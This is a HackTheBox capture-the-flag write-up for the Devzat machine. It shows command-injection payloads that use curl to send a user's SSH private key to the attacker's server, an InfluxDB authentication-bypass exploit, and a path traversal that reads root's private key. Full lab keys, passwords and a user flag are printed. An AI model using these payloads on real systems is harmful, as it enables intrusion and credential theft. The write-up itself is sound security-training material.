# Devzat - HackTheBox - Writeup
Linux, 30 Base Points, Medium

## Machine

![‏‏Devzat.JPG](images/Devzat.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```nmap``` – finding ports ```22```, ```80``` and ```8000```.

***User 1***: Found another vhost [http://pets.devzat.htb](http://pets.devzat.htb) with RCE vulnerability on ```species``` field, Using that - we get the SSH private key of ```patrick``` user.

***User 2***: Login to the ```devzat``` chat platform as ```patrick``` and we found a message from ```admin``` which says that ```influxdb``` database installed on this machine, By reading data from ```influxdb``` we found the password of ```catherine``` user.

***Root***: Login to the ```devzat``` chat platform as ```catherine``` and we found a message from ```patrick``` that says he publishes ```dev``` chat platform on port ```8443``` and the source code located on ```backups```, By reading the ```dev``` source code we found a new command ```file``` which allows reading files as root, Using that we read the ```root``` SSH private key.

![pwn.JPG](images/pwn.JPG)


## Devzat Solution

### User 1

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Devzat]
└──╼ $ nmap -sV -sC -oA nmap/Devzat 10.10.11.118
Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-29 01:45 IDT
Nmap scan report for 10.10.11.118
Host is up (0.27s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://devzat.htb/
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=10/29%Time=617B2843%P=x86_64-pc-linux-gnu%r(N
SF:ULL,C,"SSH-2\.0-Go\r\n");
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

By observing port 80 we get the following web page (Redirected to [http://devzat.htb/](http://devzat.htb/)):

![port80.JPG](images/port80.JPG)

At the end of the page we get instructions on how to use this platform:

![port8000use.JPG](images/port8000use.JPG)

We can see also the contact information which contains the user name ```patrick```:

![contact.JPG](images/contact.JPG)

Let's try to connect to port ```8000``` using that:
```console
ssh -l patrick devzat.htb -p 8000 
The authenticity of host '[devzat.htb]:8000 ([10.10.11.118]:8000)' can't be established.
RSA key fingerprint is SHA256:f8dMo2xczXRRA43d9weJ7ReJdZqiCxw5vP7XqBaZutI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[devzat.htb]:8000,[10.10.11.118]:8000' (RSA) to the list of known hosts.
Nickname reserved for local use, please choose a different one.
> evyatar9
Welcome to the chat. There are no more users
devbot: evyatar9 has joined the chat
evyatar9: 

```

By running ```/help``` we can see we are on Devzat which is a chat over SSH: [github.com/quackduck/devzat](github.com/quackduck/devzat).

![chat.JPG](images/chat.JPG)

Nothing found on this chat, Let's try to find ```vhosts```:
```console
gobuster vhost -u http://devzat.htb -w subdomains-top1milion.txt -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://devzat.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     subdomains-top1milion.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/10/29 16:32:54 Starting gobuster in VHOST enumeration mode
===============================================================
...
Found: pets.devzat.htb (Status: 200) [Size: 510]
...
``` 

We found another vhost [http://pets.devzat.htb](http://pets.devzat.htb):

![pets.JPG](images/pets.JPG)

By scrolling down we can see that we have an option to add a new pet:

![addpet.JPG](images/addpet.JPG)

By intercepting add a new path POST request using Burp we get:

![addpost.JPG](images/addpost.JPG)

After research we found that we can get RCE vulnerability on ```species``` field as follow:
```HTTP
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 35
DNT: 1
Connection: close

{
	"name":"mypet",
	"species":"$(ping -c1 10.10.14.14)"
}
```

By sending the request we can see the following ping request:
```console
┌─[evyatar@parrot]─[/hackthebox/Devzat]
└──╼ $ sudo tcpdump -i tun0 icmp
[sudo] password for user: 
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
17:19:44.320702 IP pets.devzat.htb > 10.10.16.6: ICMP echo request, id 1, seq 1, length 64
17:19:44.320829 IP 10.10.16.6 > pets.devzat.htb: ICMP echo reply, id 1, seq 1, length 64

```

It Isn't possible to get a reverse shell from that but we can read the SSH private key of the user by sending the data to our web server.

First, Let's run ```whoami``` command to see which user is it:
```console
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 104
DNT: 1
Connection: close

{"name":"xxxxxxxxxx","species":"$(curl http://10.10.14.14:8000/$(whoami))"}
```

We get as request:
```console
┌─[evyatar@parrot]─[/hackthebox/Devzat]
└──╼ $ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.118 - - [30/Oct/2021 00:34:40] code 404, message File not found
10.10.11.118 - - [30/Oct/2021 00:34:40] "GET /patrick
```

Now, Let's read the private SSH key:
```console
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 104
DNT: 1
Connection: close

{"name":"xxxxxxxxxx","species":"$(curl http://10.10.14.14:8000/$(base64 -w0 /home/patrick/.ssh/id_rsa))"}
```

And we get the SSH private key:
```console
10.10.11.118 - - [30/Oct/2021 00:36:40] "GET /LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUEwejV2R1h1NHJsSldtMmZmYmVrbGlVOE43S1N1Umo5dGFoUDMreFRrL3ovbkt6YjJVQ2k3CmtoN29JU2xvR1IrMDVMdXpacnYxc1lXY0ZWQlE2WklneHRaa2ozaXVyc2hxYms1cDNBcUpoYnc5d21wWFJhMlFqY1cwUHcKVzFuc2pWYVJmYk0zbFU4SDNZR09UemFFQlVOSzNrc0xYcDFlbXJSQU9WbjYyYzRVbVYxcmxoSi91eHdmUXVzTldtcW9wRAowQTBFc1VRSzNDMldPWElJemN0K0dUSk96QzJsbklpdmZmOFJHTGpSQUcwZGI5UC9DTFZiK2FjZy9FREJRL3JOamNCNU9uCmlkNGFwTE5oZVZTWHFpR1M5b0Y3d1pvTDBDZkh3UzI5S1FUZXNXdGNaRGdENlVKS3dTOUtSQktpaFVMSFNXaU13NlFnUnAKaEM5QlB3M3p1ZzdNcXZuWm5CYkxjY0g3elR2T0RwcUE5bEFLMi96OFdUMmpxTUl4T094a1I1ZXZIQXlJdDFDeW95cURJTgprQSs4NjJzbjNPeWx6L0toRHRJK1Y4TE5KMXpKWmVsVHZScnArcFBjbWw1Qkw2eFkzeTduS2lCSzNlM2k3VWJ3eGNISDhOCkZYWDVVblpueE0velpGZkpCYVY1dTRxS1V5blhNRFhLb3paMHRVeUxBQUFGaUY4Rm4zdGZCWjk3QUFBQUIzTnphQzF5YzIKRUFBQUdCQU5NK2J4bDd1SzVTVnB0bjMyM3BKWWxQRGV5a3JrWS9iV29UOS9zVTVQOC81eXMyOWxBb3U1SWU2Q0VwYUJrZgp0T1M3czJhNzliR0ZuQlZRVU9tU0lNYldaSTk0cnE3SWFtNU9hZHdLaVlXOFBjSnFWMFd0a0kzRnREOEZ0WjdJMVdrWDJ6Ck41VlBCOTJCams4MmhBVkRTdDVMQzE2ZFhwcTBRRGxaK3RuT0ZKbGRhNVlTZjdzY0gwTHJEVnBxcUtROUFOQkxGRUN0d3QKbGpseUNNM0xmaGt5VHN3dHBaeUlyMzMvRVJpNDBRQnRIVy9UL3dpMVcvbW5JUHhBd1VQNnpZM0FlVHA0bmVHcVN6WVhsVQpsNm9oa3ZhQmU4R2FDOUFueDhFdHZTa0UzckZyWEdRNEErbENTc0V2U2tRU29vVkN4MGxvak1Pa0lFYVlRdlFUOE44N29PCnpLcjUyWndXeTNIQis4MDd6ZzZhZ1BaUUN0djgvRms5bzZqQ01UanNaRWVYcnh3TWlMZFFzcU1xZ3lEWkFQdk90cko5enMKcGMveW9RN1NQbGZDelNkY3lXWHBVNzBhNmZxVDNKcGVRUytzV044dTV5b2dTdDN0NHUxRzhNWEJ4L0RSVjErVkoyWjhUUAo4MlJYeVFXbGVidUtpbE1wMXpBMXlxTTJkTFZNaXdBQUFBTUJBQUVBQUFHQkFLSll4a3VnY1JQUUJlMlRpL3hOaFdLY2xnCmY3bkZBeXFPVXdpWkcyd2pPRktpVmxMVEgzekFnRnBzTHRycW80V3U2N2Jxb1M1RVZWZU5wTWlwS25rbmNlQjlUWG0vQ0oKNkhuejI1bVhvNDliVjErV0dKSmRUTTRZVm1sayt1c1lVQ05maVVCckRDTnpvK09sK1lkeWdRU25iQzErOFVKTVBpcWNVcAo2UWNCUVlXSWJZbTlsOXIyUnZSSDcxQkF6bkRDeldCSGd6NGVETFREdkQ3dzR5U1N3V0pNYjRnZUhtam5EWDJZelZaUkxkCnlSVExxYUpJdDNJTHh1YjI0VkZjYXIyZmdseHdyZ3hSd3h1UWR2eGFyaXZsZzVSZjFIeWRYR0t4Y0w4cyt1VjMzMlZWYWUKaU5SYUk3SVltYTdiSjk4QU9pcVFvMGFmcE94bDNNVDZYUlpvUjVhT1U4WXhNdWx5S3JaVHdob3RSUE1XN3FSTlU0QVlVcApKSWU2ZEtNM001NHd2L2JYN01PQy9SK2VORytWRWVzV2tnZmg1dmlTZHYrdEJwbExvV2QrenhUVlIzVi9DK09nYk5VYy9XCi9sZUtYdHJWYjVNL1JDK21qNS9vYk12WU4zdmp6Tmp3MUtlTFFRMTdlL3RKbnZndSsrY3RmUGpkeE5ZVm5IeVdoRmVRQUEKQU1BT21ENTFzM0Y4c3ZCQ0xtMS9aaDVjbThBMnhwN0daVXVoRWpXWTNzS3ptZkZJeURwVk9CVlBXZ3dpWklKanVOd0Rubwppc3I0NmE5Q2pyMkJybklSN3lSbG43VkQrd0tHNmpteUNqUlN2MVV6TitYUmk5RUxBSjZiR3VrL1VqVWNvbGwwZW11VUFDClI3UkJCTXorZ1Fsc0xYZHZYRi9JYTRLTGlLWjJDSVJRSTdCQXdkbUdPdDh3Um5zY0MvKzd4SCtIM1h1L2RyckZEWUhZTzAKTEkwT2RUQzlQTHZFVzg2QVJBVHI3TUZsMmNuMHZvaElGMVFCSnVzU2Jxb3ovWlBQUUFBQURCQVBQcFpoL3JKQUJTWFduTQpFK25MMkY1YThSNHNBQUQ0NG9IaHNzeXZHZnhGSTJ6UUVvMjZYUEhwVEp5RU1BYi9IYWx1VGhwcXdOS2U0aDBad0EyckRKCmZsY0c4L0FjZUpsNGdBS2l3cmxmdUdVVXlMVmZIMnRPMnNHdWtsRkhvak5NTGl5RDJvQXVrVXdINjRpcWdWZ0pudjBFbEoKeTA3OStVWEtJRkZWUEtqcG5DSm1iY0pybGkvbmNwMjIyWWJNSUNrV3UyN3c1RUlvQTdYdlh0SmdCbDFnc1hLSkwxSnp0dApIOE02QlliaEFnTzNJVzZmdUZ2dmRwcitwamR5YkdqUUFBQU1FQTNiYVEyRCtxOFlobWZyMkVmWWo5ak0xNzJZZVk4c2hTCnZwem1LdjQ1MjZlYVY0ZVhMNVdJQ29IUnMwZnZIZU1UQkRhSGpjZUNMSGdOU2I1RjhYeUp5NlpBRmxDUlJrZE4wWHErTTAKN3ZRVXV3eEtIR1RmM2poM2dYZngva3FNOGpaNEtCa3AySU82QUpQc1daMTk1VFRaZm1PSGg5QnV0ZENmRzhGLzg1bzVnUQpJSzd2ZG1ScFNXRlZJNWdXMFBSSnRPZ2VCb0FZUm5ITDNtT2orNEtDQkFpVWdrelkvVnJNdWxId0xpcnV1dUxPWVVXMDBHCm4zTE1mVGxyL0ZsMFYzQUFBQURuQmhkSEpwWTJ0QVpHVjJlbUYwQVFJREJBPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg== HTTP/1.1" 404 -
```

By decoding it we get the following SSH private key:
```console
┌─[evyatar@parrot]─[/hackthebox/Devzat]
└──╼ $ cat b64id_rsa | base64 -d > id_rsa | cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA0z5vGXu4rlJWm2ffbekliU8N7KSuRj9tahP3+xTk/z/nKzb2UCi7
kh7oISloGR+05LuzZrv1sYWcFVBQ6ZIgxtZkj3iurshqbk5p3AqJhbw9wmpXRa2QjcW0Pw
W1nsjVaRfbM3lU8H3YGOTzaEBUNK3ksLXp1emrRAOVn62c4UmV1rlhJ/uxwfQusNWmqopD
0A0EsUQK3C2WOXIIzct+GTJOzC2lnIivff8RGLjRAG0db9P/CLVb+acg/EDBQ/rNjcB5On
id4apLNheVSXqiGS9oF7wZoL0CfHwS29KQTesWtcZDgD6UJKwS9KRBKihULHSWiMw6QgRp
hC9BPw3zug7MqvnZnBbLccH7zTvODpqA9lAK2/z8WT2jqMIxOOxkR5evHAyIt1CyoyqDIN
kA+862sn3Oylz/KhDtI+V8LNJ1zJZelTvRrp+pPcml5BL6xY3y7nKiBK3e3i7UbwxcHH8N
FXX5UnZnxM/zZFfJBaV5u4qKUynXMDXKozZ0tUyLAAAFiF8Fn3tfBZ97AAAAB3NzaC1yc2
EAAAGBANM+bxl7uK5SVptn323pJYlPDeykrkY/bWoT9/sU5P8/5ys29lAou5Ie6CEpaBkf
tOS7s2a79bGFnBVQUOmSIMbWZI94rq7Iam5OadwKiYW8PcJqV0WtkI3FtD8FtZ7I1WkX2z
N5VPB92Bjk82hAVDSt5LC16dXpq0QDlZ+tnOFJlda5YSf7scH0LrDVpqqKQ9ANBLFECtwt
ljlyCM3LfhkyTswtpZyIr33/ERi40QBtHW/T/wi1W/mnIPxAwUP6zY3AeTp4neGqSzYXlU
l6ohkvaBe8GaC9Anx8EtvSkE3rFrXGQ4A+lCSsEvSkQSooVCx0lojMOkIEaYQvQT8N87oO
zKr52ZwWy3HB+807zg6agPZQCtv8/Fk9o6jCMTjsZEeXrxwMiLdQsqMqgyDZAPvOtrJ9zs
pc/yoQ7SPlfCzSdcyWXpU70a6fqT3JpeQS+sWN8u5yogSt3t4u1G8MXBx/DRV1+VJ2Z8TP
82RXyQWlebuKilMp1zA1yqM2dLVMiwAAAAMBAAEAAAGBAKJYxkugcRPQBe2Ti/xNhWKclg
f7nFAyqOUwiZG2wjOFKiVlLTH3zAgFpsLtrqo4Wu67bqoS5EVVeNpMipKnknceB9TXm/CJ
6Hnz25mXo49bV1+WGJJdTM4YVmlk+usYUCNfiUBrDCNzo+Ol+YdygQSnbC1+8UJMPiqcUp
6QcBQYWIbYm9l9r2RvRH71BAznDCzWBHgz4eDLTDvD7w4ySSwWJMb4geHmjnDX2YzVZRLd
yRTLqaJIt3ILxub24VFcar2fglxwrgxRwxuQdvxarivlg5Rf1HydXGKxcL8s+uV332VVae
iNRaI7IYma7bJ98AOiqQo0afpOxl3MT6XRZoR5aOU8YxMulyKrZTwhotRPMW7qRNU4AYUp
JIe6dKM3M54wv/bX7MOC/R+eNG+VEesWkgfh5viSdv+tBplLoWd+zxTVR3V/C+OgbNUc/W
/leKXtrVb5M/RC+mj5/obMvYN3vjzNjw1KeLQQ17e/tJnvgu++ctfPjdxNYVnHyWhFeQAA
AMAOmD51s3F8svBCLm1/Zh5cm8A2xp7GZUuhEjWY3sKzmfFIyDpVOBVPWgwiZIJjuNwDno
isr46a9Cjr2BrnIR7yRln7VD+wKG6jmyCjRSv1UzN+XRi9ELAJ6bGuk/UjUcoll0emuUAC
R7RBBMz+gQlsLXdvXF/Ia4KLiKZ2CIRQI7BAwdmGOt8wRnscC/+7xH+H3Xu/drrFDYHYO0
LI0OdTC9PLvEW86ARATr7MFl2cn0vohIF1QBJusSbqoz/ZPPQAAADBAPPpZh/rJABSXWnM
E+nL2F5a8R4sAAD44oHhssyvGfxFI2zQEo26XPHpTJyEMAb/HaluThpqwNKe4h0ZwA2rDJ
flcG8/AceJl4gAKiwrlfuGUUyLVfH2tO2sGuklFHojNMLiyD2oAukUwH64iqgVgJnv0ElJ
y079+UXKIFFVPKjpnCJmbcJrli/ncp222YbMICkWu27w5EIoA7XvXtJgBl1gsXKJL1Jztt
H8M6BYbhAgO3IW6fuFvvdpr+pjdybGjQAAAMEA3baQ2D+q8Yhmfr2EfYj9jM172YeY8shS
vpzmKv4526eaV4eXL5WICoHRs0fvHeMTBDaHjceCLHgNSb5F8XyJy6ZAFlCRRkdN0Xq+M0
7vQUuwxKHGTf3jh3gXfx/kqM8jZ4KBkp2IO6AJPsWZ195TTZfmOHh9ButdCfG8F/85o5gQ
IK7vdmRpSWFVI5gW0PRJtOgeBoAYRnHL3mOj+4KCBAiUgkzY/VrMulHwLiruuuLOYUW00G
n3LMfTlr/Fl0V3AAAADnBhdHJpY2tAZGV2emF0AQIDBA==
-----END OPENSSH PRIVATE KEY-----

```

Let's connect as ```patrick``` using this SSH private key:
```console
┌─[evyatar@parrot]─[/hackthebox/Devzat]
└──╼ $ ssh -i id_rsa patrick@devzat.htb
The authenticity of host 'devzat.htb (10.10.11.118)' can't be established.
ECDSA key fingerprint is SHA256:0rsaIiCqLD9ELa+kVyYB1zoufcsvYtVR7QKaYzUyC0Q.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'devzat.htb,10.10.11.118' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 29 Oct 2021 09:42:05 PM UTC

  System load:  0.0               Processes:                236
  Usage of /:   61.3% of 7.81GB   Users logged in:          0
  Memory usage: 27%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118


107 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Jun 22 19:48:41 2021 from 192.168.50.1
patrick@devzat:~$
```

To understand the path to this shell we can read the following code ``/home/patrick/pets/main.go```:
```go
...
func loadCharacter(species string) string {
	cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
	stdoutStderr, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(stdoutStderr)
}
...
```

As we can see It's run a command for each ```species``` we added.


### User 2


We are logged in as ```patrick```, Let's connect to the chat again and see if we have interesting messages:
```console
patrick@devzat:~/devzat$ ssh -l patrick devzat.htb -p 8000 
The authenticity of host '[devzat.htb]:8000 ([127.0.0.1]:8000)' can't be established.
RSA key fingerprint is SHA256:f8dMo2xczXRRA43d9weJ7ReJdZqiCxw5vP7XqBaZutI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[devzat.htb]:8000' (RSA) to the list of known hosts.
admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb for you as we discussed earlier in business meeting.
patrick: Cool 👍
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
devbot: admin has left the chat
Welcome to the chat. There are no more users
devbot: patrick has joined the chat
```

As we can see, the admin installed ```influxdb```.

We can see that the machine listening to port ```8086``` which is ```influxdb``` port.

Let's create SSH tunnel to this port:
```console
┌─[evyatar@parrot]─[/hackthebox/Devzat]
└──╼ $ ssh -i id_rsa -N -L 8086:127.0.0.1:8086 patrick@devzat.htb

```

We can bypass the ```influxdb``` authentication using the following [CVE-2019-20933](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933) as follow:
```console
┌─[evyatar@parrot]─[/hackthebox/Devzat]
└──╼ $ python3 __main__.py 
  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |  
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ 
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_ 
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                                         | |                  
                                                         |_|                  
CVE-2019-20933

Insert ip host (default localhost): 
Insert port (default 8086): 
Insert influxdb user (wordlist path to bruteforce username): admin
Host vulnerable !!!
Databases list:

1) devzat
2) _internal

Insert database name (exit to close): devzat

```

We can see that we have two databases, the interesting one is probably ```devzat```.

Using this [https://songrgg.github.io/operation/influxdb-command-cheatsheet/](https://songrgg.github.io/operation/influxdb-command-cheatsheet/) we can see the ```influxdb``` commands, Let's use them to dump the data from the database:
```console
[devzat] Insert query (exit to change db): SHOW MEASUREMENTS
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "user"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}

```

We can read about measurement [here](https://docs.influxdata.com/influxdb/v1.8/concepts/glossary/#measurement).

Now, Let's get the data from ```user```:
```console
[devzat] Insert query (exit to change db): select * from "user"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

We get the password of ```catherine``` user ```woBeeYareedahc7Oogeephies7Aiseci```, Let's use it:
```console
patrick@devzat:~/devzat$ su catherine
Password: 
catherine@devzat:/home/patrick/devzat$ cd /home/catherine/
catherine@devzat:~$ cat user.txt
ed67ac2b5c9e74bb00b4c6560cc8ac6a

```

And we get the user flag ```ed67ac2b5c9e74bb00b4c6560cc8ac6a```.


### Root

Let's connect again to the chat as ```catherine```:
```console
catherine@devzat:/home/patrick$ ssh -l catherine devzat.htb -p 8000
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on
         port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password I gave you last time.
catherine: k
patrick: I left the source for your review in backups.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. See ya!
devbot: patrick has left the chat
Welcome to the chat. There are no more users
devbot: catherine has joined the chat

```

We can see that ```patrick``` leave source for ```catherine``` on ```backups```, Let's observe it:
```console
catherine@devzat:/var/backups$ ls -ltr
total 1124
-rw-r--r-- 1 root      root        6602 Jul 16 06:41 apt.extended_states.2.gz
-rw-r--r-- 1 root      root         170 Jul 16 06:41 dpkg.statoverride.0
-rw------- 1 catherine catherine  27567 Jul 16 07:00 devzat-main.zip
-rw------- 1 catherine catherine  28297 Jul 16 07:00 devzat-dev.zip
-rw-r--r-- 1 root      root        6588 Sep 21 20:17 apt.extended_states.1.gz
-rw-r--r-- 1 root      root       59142 Sep 28 18:45 apt.extended_states.0
-rw-r--r-- 1 root      root      951869 Sep 28 18:45 dpkg.status.0
-rw-r--r-- 1 root      root         268 Sep 29 11:46 dpkg.diversions.0
-rw-r--r-- 1 root      root       51200 Oct 29 06:25 alternatives.tar.0

```

By unzip the file ```devzat-dev.zip``` we find new command on ```commands.go```:
```go
func fileCommand(u *user, args []string) {
	if len(args) < 1 {
		u.system("Please provide file to print and the password")
		return
	}

	if len(args) < 2 {
		u.system("You need to provide the correct password to use this function")
		return
	}

	path := args[0]
	pass := args[1]

	// Check my secure password
	if pass != "CeilingCatStillAThingIn2021?" {
		u.system("You did provide the wrong password")
		return
	}

	// Get CWD
	cwd, err := os.Getwd()
	if err != nil {
		u.system(err.Error())
	}

	// Construct path to print
	printPath := filepath.Join(cwd, path)

	// Check if file exists
	if _, err := os.Stat(printPath); err == nil {
		// exists, print
		file, err := os.Open(printPath)
		if err != nil {
			u.system(fmt.Sprintf("Something went wrong opening the file: %+v", err.Error()))
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			u.system(scanner.Text())
		}

		if err := scanner.Err(); err != nil {
			u.system(fmt.Sprintf("Something went wrong printing the file: %+v", err.Error()))
		}

		return

	} else if os.IsNotExist(err) {
		// does not exist, print error
		u.system(fmt.Sprintf("The requested file @ %+v does not exist!", printPath))
		return
	}
	// bokred?
	u.system("Something went badly wrong.")
}
```

We can see that we have a new command ```file``` which allows us to read files, because ```devzat``` running as root we can read the files as ```root```.

Let's connect to the dev chat on port ```8443``` and read the ```root``` SSH private key:

```console
catherine@devzat:/tmp/dev/dev$ ssh -l catherine devzat.htb -p 8443
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password which you can gather from the source. I left it in our
         default backups location.
catherine: k
patrick: I also put the main so you could diff main dev if you want.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet.
         See ya!
devbot: patrick has left the chat
Welcome to the chat. There are no more users
devbot: catherine has joined the chat
catherine: /file /root/user.txt CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/root/user.txt does not exist!
```

If we are trying to read ```/root/user.txt``` we can see It appends another prefix, Let's bypass it:
```console
catherine: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
[SYSTEM] -----END OPENSSH PRIVATE KEY-----

```

And we get the ```root``` SSH private key:
```console
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

Let's use it to login as ```root```:
```console
┌─[evyatar@parrot]─[/hackthebox/Devzat]
└──╼ $ ssh -i root_id root@devzat.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 30 Oct 2021 12:12:38 AM UTC

  System load:  0.0               Processes:                242
  Usage of /:   61.2% of 7.81GB   Users logged in:          1
  Memory usage: 34%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118


107 updates can be applied immediately.
33 of these updates are standard security updates.
